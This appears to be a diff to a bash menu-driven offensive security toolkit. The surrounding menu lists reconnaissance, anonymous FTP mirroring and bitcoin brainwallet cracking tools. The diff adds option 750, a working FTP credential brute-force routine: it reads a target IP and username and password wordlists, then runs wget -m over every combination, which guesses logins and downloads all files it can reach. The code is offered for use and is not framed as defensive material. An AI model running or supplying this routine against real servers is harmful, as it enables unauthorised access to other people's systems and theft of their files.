@@ -588,6 +588,7 @@ while true; do
 	echo -ne " 739. install tor from torproject siteweb\t740. install tor via apt-transport-tor\n"
 	echo -ne " 744. get mx record from domain with dig\t745. get dns infos with host\t\t\t\t\t746. get ntp infos with ntpq\n"
 	echo -ne " 747. get netbios infos with nmblookup\t749. download all files from IP in ftp with anonymous creds\n"
+	echo -ne " 750. username and password dictionary attack with wget and ftp protocol\n"
 	echo "$SEP"
 	echo "VIRTUAL COINS - CURRENCIES"
 	echo -ne " 511. Isaacdelly/Plutus\t\t\t\t512. dan-v/bruteforce-bitcoin-brainwallet\t\t513. SMH17/bitcoin-hacking-tools\n"
@@ -3937,6 +3938,30 @@ while true; do
 		if [[ "$IP" != "" ]];
 		then
 			wget -m --no-passive ftp://anonymous:anonymous@$IP
+		fi
+	;;
+	"750")
+		echo "Digit a target IP"
+		read -p "(example, 10.11.12.13): " IP
+		if [[ "$IP" != "" ]];
+		then
+			echo "Digit a password wordlist file full path"
+			read -p "(example, /usr/share/wordlists/passwords.txt): " PWRD
+			if [[ -f "$PWRD" ]];
+			then
+				echo "Digit a username wordlist file full path"
+				read -p "(example, /usr/share/wordlists/usernames.txt): " UWRD
+				if [[ -f "$UWRD" ]];
+				then
+					for PSSW in $(cat "$PWRD");
+					do
+						for USRN in $(cat "$UWRD");
+						do
+							wget -m --no-passive "ftp://$USRN:$PSSW@$IP"
+						done
+					done
+				fi
+			fi
 		fi
 	;;
 	*)
